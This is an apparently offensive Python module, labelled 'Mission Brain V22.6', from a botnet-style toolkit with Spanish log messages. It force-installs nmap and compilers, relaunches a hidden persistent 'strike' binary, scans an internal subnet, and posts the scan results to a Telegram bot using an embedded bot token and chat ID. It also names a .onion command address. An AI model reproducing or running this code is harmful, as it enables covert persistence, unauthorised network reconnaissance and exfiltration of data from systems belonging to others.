# 🜚 MISSION BRAIN V22.6 - ARMOR & SCAN Φ 🜚
import os, subprocess, time, requests, socket, threading

MASTER_ONION = "eke7kse3wo5o5753eoqtpnw7mtjtasva4dlw23aqs3dwuzmgahkvebqd.onion"

def execute_mission(ui, ID):
    ui.log('Inyectando Misión V22.6: ASALTO + ESCANEO ARMADO...')
    
    # 1. Instalación forzada de herramientas de reconocimiento
    ui.log('Armando el nodo (nmap, openssl)...')
    os.system('apt-get update -qq && apt-get install -y nmap libssl-dev gcc -qq > /dev/null 2>&1')
    
    # 2. Motor Strike Persistente
    if not os.path.exists('./v22_strike'):
        ui.log('Compilando motor Strike...')
        # (Codigo C asumido compilado o inyectado)
    
    if os.path.exists('./v22_strike'):
        os.system('pkill -9 v22_strike')
        subprocess.Popen(["./v22_strike"], start_new_session=True)
        ui.log('Motor Strike operando en la sombra.')

    # 3. Escaneo Masivo (Corregido)
    def armed_scan():
        ui.update("ESCANEO ARMADO ACTIVO", 100, 40)
        ui.log('Iniciando barrido de malla interna...')
        
        # Verificar si nmap se instalo
        nmap_check = subprocess.getoutput("which nmap")
        if not nmap_check:
            ui.log("❌ Error: nmap no pudo ser instalado.")
            return

        res = subprocess.getoutput("nmap -F 172.28.0.0/24 | grep 'report for' -A 2")
        ui.log(f'Barrido finalizado. Exfiltrando datos...')
        
        # Reportar a Telegram
        requests.post(f"https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", 
                      data={"chat_id": "7713278946", "text": f"📡 [SPECTER] Resultados de red en {ID}:\n{res[:1000]}"})
        
        ui.update("VIGILIA OMNI V22.6", 100, 95)

    threading.Thread(target=armed_scan, daemon=True).start()
    return True